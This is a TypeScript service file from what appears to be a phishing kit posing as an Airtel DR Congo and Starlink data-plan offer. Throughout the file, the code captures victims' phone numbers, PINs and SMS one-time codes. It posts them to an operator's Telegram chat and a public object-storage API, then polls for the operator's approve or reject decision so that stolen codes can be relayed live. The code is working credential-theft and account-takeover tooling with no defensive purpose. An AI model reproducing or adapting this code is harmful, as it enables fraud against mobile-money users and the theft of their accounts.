import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
}

class TelegramService {
  private cloudIdMap: Map<string, string> = new Map();
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      pin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      cloudId?: string;
    }
  > = new Map();

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send direct Telegram message using Bot API
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    try {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const payload: any = {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      };
      if (inlineKeyboard) {
        payload.reply_markup = {
          inline_keyboard: inlineKeyboard,
        };
      }

      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      return await this.safeJson(res);
    } catch (err) {
      console.warn('[TelegramService] Direct send error:', err);
      return null;
    }
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice } = payload;
    const cleanPhone = phone.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
    const cleanPin = pin.slice(0, 4);

    let resolvedCloudId = this.cloudIdMap.get(sessionId) || sessionId;

    // 1. Try server/serverless endpoint first
    try {
      const serverRes = await fetch('/api/telegram/send-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          phone: cleanPhone,
          pin: cleanPin,
          planName,
          planPrice,
        }),
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.success) {
          if (data.cloudId) {
            resolvedCloudId = data.cloudId;
            this.cloudIdMap.set(sessionId, resolvedCloudId);
          }
          this.localSessionState.set(sessionId, {
            loginStatus: 'pending',
            otpStatus: 'idle',
            phone: cleanPhone,
            pin: cleanPin,
            planName,
            planPrice,
            cloudId: resolvedCloudId,
          });
          return true;
        }
      }
    } catch {
      // Backend unavailable (static Vercel hosting), fall through to direct cloud store + Telegram API
    }

    // 2. Direct Cloud Store + Telegram API (Guaranteed on static Vercel)
    try {
      const cloudRes = await fetch('https://api.restful-api.dev/objects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: `stl_${cleanPhone}`,
          data: {
            sessionId,
            phone: cleanPhone,
            pin: cleanPin,
            planName,
            planPrice,
            loginStatus: 'pending',
            otpStatus: 'idle',
            createdAt: Date.now(),
            lastUpdated: Date.now(),
          },
        }),
      });

      if (cloudRes.ok) {
        const cloudData = await this.safeJson(cloudRes);
        if (cloudData && cloudData.id) {
          resolvedCloudId = cloudData.id;
          this.cloudIdMap.set(sessionId, resolvedCloudId);
        }
      }
    } catch (err) {
      console.warn('Direct cloud store creation warning:', err);
    }

    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      phone: cleanPhone,
      pin: cleanPin,
      planName,
      planPrice,
      cloudId: resolvedCloudId,
    });

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${resolvedCloudId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${resolvedCloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&action=approve_login`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice } = payload;
    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
    const resolvedCloudId = this.cloudIdMap.get(sessionId) || sessionId;

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
      cloudId: resolvedCloudId,
    };
    existing.otp = cleanOtp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    // 1. Try server endpoint
    try {
      const serverRes = await fetch('/api/telegram/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          cloudId: resolvedCloudId,
          phone,
          otp: cleanOtp,
          planName,
          planPrice,
        }),
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.success) {
          return true;
        }
      }
    } catch {
      // Backend unavailable, fall through
    }

    // 2. Direct Cloud Store Update + Telegram Message
    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`);
      if (fetchRes.ok) {
        const record = await this.safeJson(fetchRes);
        const data = record?.data || {};
        data.otp = cleanOtp;
        data.otpStatus = 'pending';
        data.lastUpdated = Date.now();

        await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: record?.name || resolvedCloudId,
            data,
          }),
        });
      }
    } catch (err) {
      console.warn('Direct cloud store OTP update warning:', err);
    }

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `👤 <b>Numéro:</b> <code>+243 ${phone || existing.phone || 'Inconnu'}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${resolvedCloudId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${resolvedCloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&action=approve_otp`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Fast Real-time Status Polling (No getUpdates conflict!)
   * Queries status endpoint and cloud state store directly with zero conflicts.
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp'
  ): Promise<'pending' | 'approved' | 'rejected'> {
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
    }

    const resolvedCloudId = this.cloudIdMap.get(sessionId) || local?.cloudId || sessionId;

    // 1. Try /api/telegram/status (Serverless or Express)
    try {
      const serverRes = await fetch(`/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(sessionId)}`);
      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.exists) {
          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
        }
      }
    } catch {
      // Server endpoint not reachable
    }

    // 2. Direct Cloud State Lookup (Zero conflict, completely bypasses Telegram getUpdates)
    try {
      const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`);
      if (cloudRes.ok) {
        const record = await this.safeJson(cloudRes);
        const data = record?.data || {};

        if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
          if (local) local.loginStatus = data.loginStatus;
          return data.loginStatus;
        }
        if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
          if (local) local.otpStatus = data.otpStatus;
          return data.otpStatus;
        }
      }
    } catch {
      // Cloud check transient error
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
